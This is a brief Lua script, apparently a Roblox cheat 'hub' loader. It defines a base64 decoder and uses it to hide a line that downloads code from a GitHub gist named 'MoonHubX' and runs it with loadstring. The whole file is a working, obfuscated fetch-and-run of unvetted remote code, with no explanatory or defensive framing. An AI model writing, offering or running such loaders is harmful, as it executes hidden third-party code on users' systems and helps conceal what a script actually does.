local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function decode(data)
    data = string.gsub(data,'[^'..b..'=]','')
    return (data:gsub('.',function(x)
        if x=='=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do
            r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
        if #x~=8 then return '' end
        local c=0
        for i=1,8 do
            c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0)
        end
        return string.char(c)
    end))
end

loadstring(decode("bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vanVzdG1vb241Ni8wY2MyNWE3MWU0ZjYyNDczMmQ0NDJiYWFiNDJlODRkZi9yYXcvOTFiMTE4MTY2NWIzMjRjNWYzZGNlMWQ5YTEyNTllOWJlY2E0YmU4ZC9Nb29uSHViWCIpKSgp"))()
